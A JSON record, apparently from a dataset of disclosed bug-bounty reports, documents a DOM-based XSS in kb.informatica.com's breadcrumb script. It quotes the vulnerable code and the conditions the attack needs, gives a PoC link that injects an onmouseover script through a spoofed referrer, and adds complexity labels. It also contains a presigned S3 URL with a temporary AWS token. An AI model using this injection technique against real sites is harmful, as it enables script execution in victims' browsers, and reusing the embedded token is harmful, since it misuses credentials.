@@ -1,0 +1,44 @@
+{
+    "reported_to": "Informatica",
+    "reported_by": "s_p_q_r ",
+    "title": "[kb.informatica.com] DOM based XSS in the bindBreadCrumb function",
+    "content": "\nThe bindBreadCrumb function, which is called after the document is loaded:\nCode 57 Bytes\n1$(document).ready(function () {\n2    bindBreadCrumb();\n3});\nhas the following insecure link assignments, that use non-encoded URL values:\nCode 442 Bytes\n1strChild = \"<a href='\" + document.URL + \"' style='color:#fff !important;font-size:10px'>Search Results</a>\";\n2\n3strChild = \"<a href='\" + varCoveoSearchResultPageURL + \"' style='color:#999 !important;' >Search Results</a>\";\n4\n5strChild = \"<a href='\" + varDocumentReferrer + \"' style='color:#999 !important;' >Search Results</a>\";\n6\n7strChild = \"<a href='\" + varStaticCoveoSearchResultPageURL + \"' style='color:#999 !important;' >Search Results</a>\";\netc.\nThis gives an attacker the opportunity to inject code with Javascript there.\nAs a proof of concept let's consider the case of the referrer value injection at the https://kb.informatica.com/solution/4/Pages/7377.aspx page:\nCode 797 Bytes\n1if (qString('myk') != '') {\n2\n3\tvar previousUrl = document.referrer.toLowerCase();\n4\n5\tvar varCoveoSearchResultPageName = fnGetSearchPageName();\n6\n7\tif (previousUrl.indexOf(\"/home.aspx\") > -1) {\n8\t\n9\t\t<...>\n10\t\t\n11\t} else {\n12\t\n13\tif (varCoveoSearchResultPageName != \"\") {\n14\t\n15\t\t<...>\n16\t\t\n17\t} else {\n18\t\t\n19\t\tvar varDocumentReferrer = document.referrer;\n20\n21\t\tif (varDocumentReferrer != \"\") {\n22\t\t\n23\t\t\tif (varDocumentReferrer.toLowerCase().indexOf(fnGetKBSFDCHostName()) != -1) {\n24\t\t\t\n25\t\t\t\tvar li = document.createElement(\"li\");\n26\t\t\t\tstrChild = \"<a href='\" + varDocumentReferrer + \"' style='color:#999 !important;' >Search Results</a>\";\n27\t\t\t\tli.innerHTML = strChild;\n28\t\t\t\tdocument.getElementById('DynamicBreadcrumb').appendChild(li);\n29\t\t\t\t\n30\t\t\t} else {\n31\t\t\t\t\n32\t\t\t\t<...>\n33\t\t\t\t\n34\t\t\t}\n35\t\t\t\n36\t\t}\n37\t\telse {\n38\t\t\t\n39\t\t\t<...>\n40\t\t\t\n41\t\t}\n42\n43\t}\n44\t\n45\t<...>\n46\n47\t}\n48}\nAs we can see, for the attack to succeed, the query string parameter myk must be non-empty:\nCode 27 Bytes\n1if (qString('myk') != '') {\nthe referrer value most not contain /home.aspx:\nCode 116 Bytes\n1var previousUrl = document.referrer.toLowerCase();\n2\n3if (previousUrl.indexOf(\"/home.aspx\") > -1) {\n4\n5\t<...>\n6\t\n7} else {\nthe CoveoSearchUrl cookie value must be mepty:\nCode 355 Bytes\n1function fnGetSearchPageName() {\n2\t\n3\tvar searchPageName = GetKBCookieValue(\"CoveoSearchUrl\");\n4\t\n5\tif (searchPageName != \"\") {\n6\t\tsearchPageName = searchPageName.split(\"/\").slice(-1)[0].split(\"?\")[0];\n7\t}\n8\t\n9\treturn searchPageName;\n10}\n11\n12<...>\n13\n14var varCoveoSearchResultPageName = fnGetSearchPageName();\n15\n16if (varCoveoSearchResultPageName != \"\") {\n17\n18\t<...>\n19\t\n20} else {\nand the referrer value must contain //search.informatica.com:\nCode 332 Bytes\n1function fnGetKBSFDCHostName() {\n2\t\n3\t<...>\n4\t\n5\tif (document.location.href.indexOf(\"kb.informatica.com\") > -1) {\n6\t\treturn \"//search.informatica.com\"; \n7\t}\n8\t\n9\t<...>\n10\t\n11}\n12\n13<...>\n14\n15var varDocumentReferrer = document.referrer;\n16\n17if (varDocumentReferrer != \"\") {\n18\t\t\n19\tif (varDocumentReferrer.toLowerCase().indexOf(fnGetKBSFDCHostName()) != -1) {\nPoC:\nOpen the http://spqr.zz.mu/loc.php?//search.informatica.com&'/onmouseover='alert(document.domain)'&url=https://kb.informatica.com/solution/4/Pages/17377.aspx?myk=xxx link in IE\nWait for the page to load and put the mouse cursor over the \"Search results\" link on top\nThe script will be executed:\n<image_0>\nTested with Internet Explorer 11.447 and Microsoft Edge 38.14393.\nSame for the other link assignment cases.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Cross-site Scripting (XSS) - Generic"
+    ],
+    "screenshots": {
+        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/142/063/bc67a88fcd73a6cb3690bd87c9061f0a694ecafd/inf_xss.png?response-content-disposition=attachment%3B%20filename%3D%22inf_xss.png%22%3B%20filename%2A%3DUTF-8%27%27inf_xss.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVEP425OI%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T210845Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCM%2BstUzpO3%2BwHWqME7R0RgaSnbMmx4XDLnJPj6yqnZEQIgZH6a0gM9JNLqF98fNlGTF5udtNOddAGmoKztGcN%2FSxUqsQUIMhADGgwwMTM2MTkyNzQ4NDkiDJEb7f8xMPYwAHyOWSqOBQ01q3qDHypWjv22k%2B5MuOiOy9IWTvFJ0dxWV7T6uUm7Tvv%2B9u%2FepGtc%2FI70kkwpoz53YvmXecCYI9PU3qEgw05hFOGC%2BGb5OmEQWvi6QGxhef8as%2B7uifw0ybrR%2Bmo8rUKHddakZRdct6KLCYoZfPUIMPnGTS60P8HbNmKffl1yVpLlr%2BzhzOdsvgyejQMqCi125fUmNHH19N0l0rWtZ36lxUlY%2BiS3di6hiVmTE2BHSLh%2BWX1KyDJ5VZANiAVoG78NfG6KXzwaiifq3W4tLvh34TJuoDQHt5eUorFy3V2Bk0C84B8%2BdFkPJWi2FmdQGT0zMLo7LvceGAU5xj9vmD4jj5cmdy9jSC1tMYHJQESDIahceIMbRXIpMxCTCFbp5Z0NlRsyhIOKBMdvyLEXW3JXbPraBije%2FSi9SkBN7Ppta1K5sxt0pVKzZvyHxD%2FXOa2B5UtqKlR8BLoRmJlOc5mrBw9xGIQWUBis0LbupXvmq0a4z6irSO76QPSLL0IDAgfn2EfCBVX08GvNVlr9gDnmvMJfdmERGxQD59rlWF9pEe3tpYZy00hv2Fc9gl4ozamvsMb4QyzVTP2Lo%2FgZP3lkB1QUjytA4%2FAgNCh%2BLq%2FDpP9h9F%2BIOk1Chs3toxuOtaStxtmH3O4kI3hqYbNMHY2%2FWyIOO%2F2fncp%2BXFzVc5FB%2BGLX%2FN8Ib0%2ByynPV52YTycs1rO%2FbT%2F5Z0tCIDus4nnwYYGJAs18APR5l1nnwXL%2FqDzUV%2BXw7vR692E9G%2F4aB6%2BbDGutv5NwgrrugW2qxmO2zf3mFBdieOEL9EidEY1qGtK6ATkcsKkDRNHipZMsEX4rBPzvnyaS%2BFSXWqxSJPbzRILCb45c5wWIXXscvXTCO7JC%2FBjqxAf0RRDW1N%2FrCzX%2B9JS7j1ZfarA8FzbFdep55EuXE3Jmrq78cdv%2BGlBQpHfsE7WsuSoNdmO1N%2B%2FEQSmfs08RQO5PcoZOi42jNwWdEQ7s7lCgspHzrIV0uoCF%2Bsc8uwgsmsNo4lp5adFWc%2BhD8a1dDXNZ%2FuOcoQeJsjkfTA%2BkWpZURMVRXTy1pdMSRf5sIeafVRgUZyfjz27XqFjMVgcSC5LEvCkMD1Guq%2BVR1XTxglgU3TQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=41fb7ada4ff8123587bc031d71a2a2856bd83e5ae9c0bef981fa858d28d24966"
+    },
+    "disclosed_date": 1498326840,
+    "report_url": "https://hackerone.com/reports/189834",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Open the link http://spqr.zz.mu/loc.php?//search.informatica.com&'/onmouseover='alert(document.domain)'&url=https://kb.informatica.com/solution/4/Pages/17377.aspx?myk=xxx in Internet Explorer."
+        ],
+        [
+            2,
+            "Wait for the page to load and hover the mouse cursor over the 'Search results' link at the top to execute the script."
+        ]
+    ],
+    "vuln_description": "The vulnerability is a DOM-based XSS in the bindBreadCrumb function, where insecure link assignments use non-encoded URL values, allowing an attacker to inject malicious JavaScript via the referrer value under specific conditions.",
+    "reason": "The attack requires multiple specific conditions to be met (non-empty myk parameter, referrer not containing /home.aspx, empty CoveoSearchUrl cookie, and referrer containing //search.informatica.com), which involves understanding and manipulating several components of the application's state and logic.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "authnz_metadata": {
+        "reason": "The DOM-based XSS vulnerability involves manipulating the referrer value to inject malicious JavaScript, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions and resource IDs, not on testing for DOM-based XSS vulnerabilities.",
+        "is_detectable": false
+    }
+}
